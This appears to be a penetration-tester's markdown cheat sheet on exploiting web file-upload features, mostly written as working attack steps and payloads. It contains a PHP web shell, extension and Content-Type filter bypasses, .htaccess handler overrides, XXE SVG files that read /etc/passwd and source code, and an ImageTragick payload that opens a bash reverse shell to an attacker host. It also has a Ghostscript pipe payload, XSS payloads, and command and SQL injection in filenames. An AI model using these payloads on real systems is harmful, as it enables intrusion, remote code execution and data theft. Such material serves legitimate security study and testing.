---
id: Exploitation
aliases: []
tags:
  - Webapp/Exploitation/File-Upload/Exploitation
---

# Exploitation

Exploit the file upload functionality to bypass restrictions

<!-- Resources {{{-->
> [!info]- Resources
>
> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
>
<!-- }}} -->

<!-- Info {{{-->
> [!info]-
>
> - x: Disallowed
> - ✓: Allowed
>
> | Extension       | Content-Type header     | Magic bytes | Typical Goal |
> | --------------- | ----------------------- | --- | --- |
> | x  (`.php`)     | ✓ (`image/jpeg`)        | x PHP | Trusts header only |
> | x  (`.php`)     | x (`application/x-php`) | ✓ image | Trusts magic bytes |
> | ✓  (`.jpg`)     | x (`application/x-php`) | x PHP | Trusts extension only |
> | ✓  (`.jpg`)     | ✓ (`image/jpeg`)        | x PHP | No content inspection |
> | `shell.php.jpg` | ✓ (`image/jpeg`)        | x PHP | Regex / weak whitelist |
> | `shell.jpg.php` | ✓ (`image/jpeg`)        | x PHP | Handler misconfig |
> | .ph%70, .PHp    | ✓ (`image/jpeg`)        | x PHP | Case / encoding issue |
> | .htaccess       | text/plain              | valid | Handler override |
> | image polyglot  | ✓ (`image/jpeg`)        | ✓ image+PHP | Deep bypass |
> | empty filename  | ✓ (`image/jpeg`)        | x PHP | Parsing logic flaw |
>
> Allowed (A) or Disallowed (D). That gives 2³ = 8 combinations:
> - A Extension / A MIME / A Content-Type (*fully allowed*)
> - A Extension / A MIME / D Content-Type
> - A Extension / D MIME / A Content-Type
> - A Extension / D MIME / D Content-Type
> - D Extension / A MIME / A Content-Type
> - D Extension / A MIME / D Content-Type
> - D Extension / D MIME / A Content-Type
> - D Extension / D MIME / D Content-Type (*fully blocked*)
>
<!-- }}} -->

![[Untitled Diagram.drawio.svg]]

___


<!-- Filter Bypass {{{-->
## Filter Bypass

<!-- Client-Side Validation {{{-->
### Client-Side Validation

Enumerate and bypass or disable client-side validation

**Enumeration**

Enumerate allowed file types in the File Upload dialog

1. Open the File Upload dialog

<!-- Example {{{-->
> [!example]-
>
> The `File Upload` dialog limits the allowed image formats
>
> ![[file-upload-select-file-types.jpg]]
>
> The `File Upload` dialog allows [unrestircted file upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
>
> ![[file-upload-arbitrary.png]]
>
<!-- }}} -->

**Filename Modification**

Modify the `filename` parameter in the POST Request

1. Intercept upload request

2. Modify `filename` parameter & add payload

```sh
filename="shell.php"
```

```php
<?php system($_REQUEST['cmd']); ?>
```

<!-- Example {{{-->
> [!example]-
>
> ![[burp-filename-modification.png]]
>
<!-- }}} -->

**Disable Validation**

Disable JavaScript validation function call

1. Inspect HTML surrounding the upload functionality

<!-- Example {{{-->
> [!example]-
>
> [Page Inspector](https://firefox-source-docs.mozilla.org/devtools-user/page_inspector/):
> Highlight the upload button/profile picture
>
> ![[page-inspector.png]]
>
<!-- }}} -->

2. Identify and remove the JavaScript function called
   from the HTML element to validate the file

<!-- Example {{{-->
> [!example]-
>
> [onchange](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event)
> calls a JavaScript function to validate files
>
> 1. Identify
>
> ```sh
> <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
> ```
>
> ```sh
> onchange="checkFile(this)"
> ```
>
> 2. Disable
>
> ```sh
> onchange=""
> ```
>
> [onsubmit](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/submit_event)
> calls a JavaScript function to validate files
> within the enclosing `form`
>
> 1. Identify
>
> ```sh
> <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onsubmit="if(validate()){upload()}">
>         <input type="file" name="uploadFile" id="uploadFile" onchange="showImage()" accept=".jpg,.jpeg,.png">
>         <img src="/profile_images/default.jpg" class="profile-image" id="profile-image">
>         <input type="submit" value="Upload" id="submit">
> </form>
> ```
>
> 2. Disable
>
> ```sh
> onsubmit="if(validate()){upload()}"
> ```
>
> ```sh
> onsubmit="upload()"
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Server-Side Validation {{{-->
### Server-Side Validation

Bypass server-side validation

<!-- Tip - Wordlists {{{-->
> [!tip]- Wordlists
>
> [[Seclists#Web Extensions|Seclists]]
>
<!-- }}} -->

<!-- Blacklist Filters {{{-->
#### Blacklist Filters

Bypass blacklist filters with a valid extension
that is not covered by the blacklist

<!-- Info {{{-->
> [!info]-
>
> The PHP code is taking the file extension (`$extension`)
> from the uploaded file name (`$fileName`)
> and then comparing it against
> a list of blacklisted extensions (`$blacklist`)
>
> 1. `$fileName`: Get uploaded filename
> 2. `$extension`: Get file extension from `$fileName`
> 3. `$blacklist`: Array of disallowed extensions
> 4. Compare `$extension` against `$blacklist`
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > The blacklist is not comprehensive
> >
> <!-- }}} -->
>
> ```php
> $fileName = basename($_FILES["uploadFile"]["name"]);
> $extension = pathinfo($fileName, PATHINFO_EXTENSION);
> $blacklist = array('php', 'php7', 'phps');
>
> if (in_array($extension, $blacklist)) {
>     echo "File type not allowed";
>     die();
> }
> ```
>
<!-- }}} -->

<!-- Tip - Wordlists {{{-->
> [!tip]- Wordlists
>
> [[Seclists#Web Extensions|Seclists]]
>
<!-- }}} -->

Fuzz allowed file extensions

```sh
filename="cat§.png§"
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite/Intruder|Burp Suite Intruder]]
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-file-extensions.png]]
>
> [[ZAP/Fuzzer|ZAP Fuzzer]]
>
> ![[zap-fuzz-file-extensions.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- Whitelist {{{-->
#### Whitelist Filters

Bypass whitelist filters are testing the file extensions
against a list of allowed file extensions

<!-- Info {{{-->
> [!info]-
>
> The PHP code uses Regular Expression (*RegEx*)
> to test whether the filename contains
> any whitelisted image extensions
>
> ```sh
> $fileName = basename($_FILES["uploadFile"]["name"]);
>
> if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > RegEx only checks whether the file name contains the extension
> > and not if it actually ends with it
> > ```sh
> > .jpg.php
> > ```
> > ```sh
> > .png.php5
> > ```
> <!-- }}} -->
>
<!-- }}} -->

**Double Extension**

Fuzz double extensions
that are not checked by the whitelist

<!-- Info {{{-->
> [!info]-
>
> The PHP script uses a Regular Expression (*RegEx*)
> to test whether the filename **contains**
> any whitelisted image extensions
>
> ```sh
> $fileName = basename($_FILES["uploadFile"]["name"]);
>
> if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > RegEx only checks whether the file name contains the extension
> > and not if it actually ends with it
> > ```sh
> > .jpg.php
> > ```
> > ```sh
> > .png.php5
> > ```
> <!-- }}} -->
>
<!-- }}} -->

1. Use a whitelisted first extension

2. Fuzz allowed double extensions

```sh
filename="cat.png§.ext§"
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite/Intruder|Burp Suite Intruder]]
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-double-extensions.png]]
>
> [[ZAP/Fuzzer|ZAP Fuzzer]]
>
> ![[zap-fuzz-double-extensions.png]]
>
<!-- }}} -->

**Reverse Double Extension**

Fuzz reverse double extensions
that are not checked by the whitelist

<!-- Info {{{-->
> [!info]-
>
> Apache2's misconfigured `/etc/apache2/mods-enabled/php7.4.conf`
> may allow PHP code execution
>
> ```xml
> <FilesMatch ".+\.ph(ar|p|tml)">
>     SetHandler application/x-httpd-php
> </FilesMatch>
> ```
>
> <!-- Warning {{{ -->
> > [!warning]
> >
> > Files with reverse double extensions may pass the RegEx filter
> > and get executed
> >
> > ```sh
> > .php.jpg
> > ```
> > ```sh
> > .php5.png
> > ```
> <!-- }}} -->
>
<!-- }}} -->

1. Use a whitelisted final extension

2. Fuzz allowed reverse double extensions

```sh
filename="cat§.ext§.jpg"
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite/Intruder|Burp Suite Intruder]]
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-reverse-double-extensions.png]]
>
> [[ZAP/Fuzzer|Zap Fuzzer]]
>
> ![[zap-fuzz-reverse-double-extensions.png]]
>
<!-- }}} -->

**Character Injection**

Inject special characters
that can cause the web application to misinterpret the filename

<!-- Info {{{-->
> [!info]-
>
> Applications may end parsing the file name after special characters,
> and store the file while passing whitelist
>
> PHP server version `5.X` and earlier end parsing after `%00`
>
> ```sh
> shell.php%00.jpg
> ```
>
> Windows servers may end parsing after `:`
>
> ```sh
> shell.aspx:.jpg
> ```
>
<!-- }}} -->

1. Generate special character permutation wordlist

<!-- Example {{{-->
> [!example]-
>
> Generate all permutations to inject special characters
> before and after both `PHP` and `JPG` extensions
>
> ```sh
> for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
>     for ext in '.php' '.phps'; do
>         echo "shell$char$ext.jpg" >> wordlist.txt  # shell%20.php.jpg
>         echo "shell$ext$char.jpg" >> wordlist.txt  # shell.php%20.jpg
>         echo "shell.jpg$char$ext" >> wordlist.txt  # shell.jpg%20.php
>         echo "shell.jpg$ext$char" >> wordlist.txt  # shell.jpg.php%20
>     done
> done
> ```
>
<!-- }}} -->

2. Fuzz `filename` with injected characters

```sh
filename="§§"
```

<!-- Example {{{-->
> [!example]-
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-character-injection.png]]
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Type Filters {{{-->
### Type Filters

Bypass file type filters on the back-end server

<!-- Content-Type {{{-->
#### Content-Type

[[Content-Type]] header validation is set on the back-end
to validate file type

<!-- Info {{{-->
> [!info]-
>
> PHP application Content-Type header test to validate the file type
>
> - `$type`: Set from the uploaded file's Content-Type header
>
> ```sh
> $type = $_FILES['uploadFile']['type'];
>
> if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
<!-- }}} -->

**Fuzz Header**

Fuzz allowed [[Content-Type]] headers

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> All Content-Types
>
> [[Seclists#Content Type|SecLists]]
>
> Filter Content-Types (*optional*)
>
> ```sh
> cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
> ```
>
<!-- }}} -->

```sh
Content-Type §image/jpeg§
```

<!-- Example {{{-->
> [!example]-
>
> <!-- Tip {{{-->
> > [!tip]
> >
> > Disable [Payload Encoding](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/processing)
> >
> <!-- }}} -->
>
> ![[burp-fuzz-content-type.png]]
>
<!-- }}} -->

**Empty Header**

Set [[Content-Type]] header to empty

<!-- Info {{{-->
> [!info]-
>
> If `Content-Type` is empty or missing
>
> - The filter doesn’t match `image/jpeg` vs `application/php`
> - The backend falls back to default handling
> - The check may not happen
>
<!-- }}} -->

```sh
Content-Type:
```

<!-- }}} -->

<!-- MIME-Type {{{-->
#### MIME-Type

[[HTTP/Header/Representation/MIME-Type|MIME-Type]]
validation is set on the back-end to validate file type
based on [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

<!-- Info {{{-->
> [!info]-
>
> PHP web application MIME type test
>
> ```php
> $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
>
> if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
>     echo "Only images are allowed";
>     die();
> }
> ```
>
<!-- }}} -->

**Polyglot File**

Create [polyglot](https://en.wikipedia.org/wiki/Polyglot_(computing))
files with ASCII printable bytes
to bypass MIME-Type validation

GIF

```sh
echo "GIF8" > text.jpg
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> echo "GIF8" > text.jpg
> ```
> ```sh
> echo "GIF87a" > text.jpg
> ```
> ```sh
> echo "GIF89a" > text.jpg
> ```
>
> ![[burp-polyglot.png]]
>
>
>
<!-- }}} -->

PNG

```sh
\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
```

JPG

```sh
\xff\xd8\xff
```

**Polyglot Metadata**

Create [polyglot](https://en.wikipedia.org/wiki/Polyglot_(computing))
file with malicious payload in metadata

1. [[exiftool]] — Create polyglot image

```sh
exiftool -Comment="<?php echo 'START ' . <php_payload>>" <image.jpg> -o <polyglot.php>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
> ```
>
<!-- }}} -->

2. Find the `START` string within the binary image data response

<!-- }}} -->

___
<!-- }}} -->

> [!todo]
>
> - Allowed [MIME-Type] + Disallowed extension
> - Disallowed [MIME-Type] + Allowed extension

<!-- }}} -->

<!-- Configuration Bypass {{{-->
## Configuration Bypass

Bypass server configuration restrictions

<!-- Path Traversal {{{-->
### Path Traversal

Upload a file outside of the default upload directory

<!-- Info {{{-->
> [!info]-
>
> A web application may restrict file execution in directories
> where user-supplied files are stored,
> but may allow execution in other directories
>
<!-- }}} -->

1. Upload a file via [[Path Traversal/Exploitation#Bypass|Path Traversal pattern]]

```sh
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```

```sh
filename="..%2fshell.php"
```

<!-- Example {{{-->
> [!example]-
>
> The file has been uploaded to `avatars/../shell.php`
>
> ![[traversal-post.png]]
>
<!-- }}} -->

2. Investigate the upload directory

<!-- Example {{{-->
> [!example]-
>
> The application is querying the file from `files/avatars/..%2fshell.php`
>
> ![[traversal-request.png]]
>
<!-- }}} -->

3. Query the uploaded file

```sh
GET https://$target/files/shell.php HTTP/1.1
```

<!-- Example {{{-->
> [!example]-
>
> ![[traversal-get.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- Apache2.conf {{{-->
### Apache2.conf

Apache servers execute files configured in `/etc/apache2/apache2.conf`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> LoadModule php_module /usr/lib/apache2/modules/libphp.so
>     AddType application/x-httpd-php .php
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- Htaccess {{{-->
### Htaccess

Upload a [[Apache HTTP Server/General#.htaccess|.htaccess]]
file to override [[Apache HTTP Server/General|Apache HTTP Server]]
rule and execute [[PHP/General|PHP]]

**Override .htaccess**

Override `.htaccess` to make Apache HTTP Server
interpret arbitrary file extensions as `.php`

1. Create `.htaccess` file

```sh
AddType <mime-type> <extension> [extension ...]
```

<!-- Example {{{-->
> [!example]-
>
> Execute `.png` extensions as `.php`
>
> ```sh
> echo "AddType application/x-httpd-php .png" > .htaccess
> ```
>
> Execute `.exploit` extensions as `.php`
>
> ```sh
> echo "AddType application/x-httpd-php .exploit" > .htaccess
> ```
>
<!-- }}} -->

2. Upload `.htaccess` to the target

<!-- Example {{{-->
> [!example]-
>
> ![[htaccess.png]]
>
<!-- }}} -->

**Polyglot .htaccess**

Create polyglot `.htaccess` file if [[#MIME-Type]]
(*[exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php)*)
is validated

[.htaccess/xbm](https://en.wikipedia.org/wiki/X_BitMap)
image

<!-- Example {{{-->
> [!example]-
>
> ```sh
> width = 50
> height = 50
> payload = '# .htaccess file'
>
> with open('.htaccess', 'w') as htaccess:
>     htaccess.write('#define test_width %d\n' % (width, ))
>     htaccess.write('#define test_height %d\n' % (height, ))
>     htaccess.write(payload)
> ```
<!-- }}} -->

[.htaccess/wbmp](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format)
image

<!-- Example {{{-->
> [!example]-
>
> ```sh
> type_header = b'\x00'
> fixed_header = b'\x00'
> width = b'50'
> height = b'50'
> payload = b'# .htaccess file'
>
> with open('.htaccess', 'wb') as htaccess:
>     htaccess.write(type_header + fixed_header + width + height)
>     htaccess.write(b'\n')
>     htaccess.write(payload)
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Web.config {{{-->
### Web.config

[[Microsoft IIS/General|Microsoft IIS]] sets directory-specific configuration
via [[Microsoft IIS/General#web.config|web.config]]

<!-- Example {{{-->
> [!example]-
>
> Allow `JSON` files to be served to users
>
> ```sh
> <staticContent>
>     <mimeMap fileExtension=".json" mimeType="application/json" />
>     </staticContent>
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Images {{{-->
## Images

<!-- DoS {{{-->
### DoS

File upload vulnerabilities may lead to
[Denial of Service](https://en.wikipedia.org/wiki/Denial-of-service_attack)

<!-- Decompression Bomb {{{-->
#### Decompression Bomb

[Decompression Bomb](https://en.wikipedia.org/wiki/Zip_bomb)
(*a.k.a. zip bomb or zip of death*)
is a malicious archive file designed to crash the program
or system reading it

<!-- }}} -->

<!-- Pixel Flood {{{-->
#### Pixel Flood

**Pixel Flood** is a malicious image file where
compression data is modified to display its size
(*`0xffff` x `0xffff`*) to make the web application
attempt to allocate enough memory
(*~4 [PB](https://simple.wikipedia.org/wiki/Petabyte)*)
resulting in a crash

<!-- }}} -->

<!-- }}} -->

<!-- SVG {{{-->
### SVG

<!-- XXE {{{-->
#### XXE

[XML External Entity attack](https://en.wikipedia.org/wiki/XML_external_entity_attack)
(*or XXE attack*)
is an attack against an application that parses XML input

**Information Disclosure**

Upload malicious XML to read web application source code
that may disclose

- Upload directory
- Allowed extensions
- File naming scheme

1. Create SVG file

```sh
touch exploit.svg
```

2. Add malicious XML

<!-- Example {{{-->
> [!example]-
>
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
> <svg>&xxe;</svg>
> ```
>
<!-- }}} -->

3. Inspect page source and [[Base64#Decode|Decode Base64]]
   for information disclosure

<!-- Example {{{-->
> [!example]-
>
> ![[svg-xxe-base64.png]]
>
<!-- }}} -->

**Read Files**

Upload malicious XML to read files

1. Create SVG file

```sh
touch exploit.svg
```

2. Add malicious XML

<!-- Example {{{-->
> [!example]-
>
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
> <svg>&xxe;</svg>
> ```
>
<!-- }}} -->

3. Inspect page source for information disclosure

<!-- Example {{{-->
> [!example]-
>
> ![[svg-xxe.png]]
>
<!-- }}} -->

<!-- }}} -->

<!-- CVE {{{-->
#### CVE

[CVE-2020-29599](https://nvd.nist.gov/vuln/detail/CVE-2020-29599) —
ImageMagick Shell Injection

<!-- Info {{{-->
> [!info]-
>
> [ImageMagick](https://en.wikipedia.org/wiki/ImageMagick)
> before `6.9.11-40` and `7.x` before `7.0.10-40`
> mishandles the `-authenticate` option,
> which allows setting a password for password-protected PDF files
>
> The user-controlled password was not properly escaped/sanitized
> and it was therefore possible to inject additional shell commands
> via `coders/pdf.c`
>
<!-- }}} -->

[CVE-2019-12921](https://nvd.nist.gov/vuln/detail/CVE-2019-12921) —
Graphicsmagick Arbitrary File Read

<!-- Info {{{-->
> [!info]-
>
> [GraphicsMagick](https://en.wikipedia.org/wiki/GraphicsMagick)
> before `1.3.32`, the text filename component
> allows remote attackers to read arbitrary files
> via a crafted image because of TranslateTextEx for SVG.
>
<!-- }}} -->

[CVE-2016-3714](https://nvd.nist.gov/vuln/detail/CVE-2016-3714) —
ImageMagick "ImageTragick" Code Execution

<!-- Info {{{-->
> [!info]-
>
> The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT,
> (6) SHOW, (7) WIN, and (8) PLT coders in [ImageMagick](https://en.wikipedia.org/wiki/ImageMagick)
> before `6.9.3-10` and `7.x` before `7.0.1-1`
> allow remote attackers to execute arbitrary code
> via shell metacharacters in a crafted image,
> aka "ImageTragick."
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> - [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/#cve-20163714-imagetragik)
> - [ExploitDB](https://www.exploit-db.com/exploits/39767)
>
> ```sh
> push graphic-context
> viewbox 0 0 640 480
> fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1|touch "hello)'
> pop graphic-context
> ```
>
> ```sh
> %!PS
> userdict /setpagedevice undef
> save
> legal
> { null restore } stopped { pop } if
> { legal } stopped { pop } if
> restore
> mark /OutputFile (%pipe%id) currentdevice putdeviceprops
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- PDF {{{-->
### PDF

PDF/Ghostscript vulnerabilities

[CVE-2019-10216](https://nvd.nist.gov/vuln/detail/CVE-2019-10216) —
Privilege escalation

<!-- Info {{{-->
> [!info]-
>
> In [Artifex Ghostscript](https://en.wikipedia.org/wiki/Ghostscript)
> before version `9.50`, the `.buildfont1` procedure
> did not properly secure its privileged calls,
> enabling scripts to bypass `-dSAFER` restrictions.
>
> An attacker could abuse this flaw
> by creating a specially crafted PostScript file
> that could escalate privilege
> and access files outside of restricted areas.
>
<!-- }}} -->

[CVE-2019-6116](https://nvd.nist.gov/vuln/detail/CVE-2019-6116) —
Remote Code Execution

<!-- Info {{{-->
> [!info]-
>
> In [Artifex Ghostscript](https://en.wikipedia.org/wiki/Ghostscript)
> through `9.26`, ephemeral or transient procedures
> can allow access to system operators, leading to remote code execution
>
<!-- }}} -->

[CVE-2018-16509](https://nvd.nist.gov/vuln/detail/CVE-2018-16509) —
Code Execution

<!-- Info {{{-->
> [!info]-
>
> In [Artifex Ghostscript](https://en.wikipedia.org/wiki/Ghostscript)
> before `9.24`, incorrect "restoration of privilege" checking
> during handling of `/invalidaccess` exceptions
> could be used by attackers able to supply crafted PostScript
> to execute code using the "pipe" instruction
>
<!-- }}} -->

[CVE-2017-8291](https://nvd.nist.gov/vuln/detail/cve-2017-8291) —
Remote Command Execution

<!-- Info {{{-->
> [!info]-
>
> [Artifex Ghostscript](https://en.wikipedia.org/wiki/Ghostscript)
> through 2017-04-26 allows `-dSAFER` bypass and remote command execution
> via `.rsdparams` type confusion with a "/OutputFile (%pipe%" substring
> in a crafted `.eps` document that is an input to the gs program,
> as exploited in the wild in April 2017
>
<!-- }}} -->

[CVE-2019-1481X]()

> [!todo]

<!-- }}} -->

___
<!-- }}} -->

<!-- XSS {{{-->
## XSS

Many file types introduce a [[XSS/General#Stored XSS|Stored XSS]]
vulnerability

**Web application display an image's metadata**

[[Exiftool]] — Include XSS payload in metadata

```sh
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

[SVG](https://en.wikipedia.org/wiki/SVG) —
Include XSS payload in SVG XML data

<!-- Example {{{-->
> [!example]-
>
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
> <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
>     <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
>     <script type="text/javascript">alert(window.origin);</script>
> </svg>
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Other {{{-->
## Other

<!-- File Name Injection {{{-->
### File Name Injection

Malicious strings in the file name may get executed or processed
if the file name is reflected on the page

Command Execution

<!-- Example {{{-->
> [!example]-
>
> If the web application attempts to move the file with an OS command
> then the file name would inject `whoami`
>
> ```sh
> file$(whoami).jpg
> ```
> ```sh
> file`whoami`.jpg
> ```
> ```sh
> file.jpg||whoami
> ```
>
<!-- }}} -->

[[XSS/General|XSS]] Injection

<!-- Example {{{-->
> [!example]-
>
> ```sh
> <script>alert(window.origin);</script>
> ```
>
>
<!-- }}} -->

SQL Injection

<!-- Example {{{-->
> [!example]-
>
>
> ```sh
> file';select+sleep(5);--.jpg
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- Windows-Specific Attacks {{{-->
### Windows-Specific Attacks

Inject Reserved wildcard characters

<!-- Example {{{-->
> [!example]-
>
> ```sh
> |
> ```
> ```sh
> <
> ```
> ```sh
> >
> ```
> ```sh
> *
> ```
> ```sh
> ?
> ```
<!-- }}} -->

Inject reserved names the web application is not allowed to write

<!-- Example {{{-->
> [!example]-
>
> ```sh
> CON
> ```
> ```sh
> COM1
> ```
> ```sh
> LPT1
> ```
> ```sh
> NUL
> ```
>
<!-- }}} -->

Overwrite existing files or refer to non-existent files
using [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename)

<!-- Example {{{-->
> [!example]-
>
> Refer to `hackthebox.txt`
>
> ```sh
> HAC~1.TXT
> ```
> ```sh
> HAC~2.TXT
> ```
>
> Overwrite `web.conf`
>
> ```sh
> WEB~1.CON
> ```
<!-- }}} -->

<!-- }}} -->

<!-- HTTP Verb Tampering {{{-->
### HTTP Verb Tampering

HTTP verb tampering (e.g., `TRACK`, `PUT`, `MOVE`)

> [!todo]

<!-- }}} -->

___
<!-- }}} -->
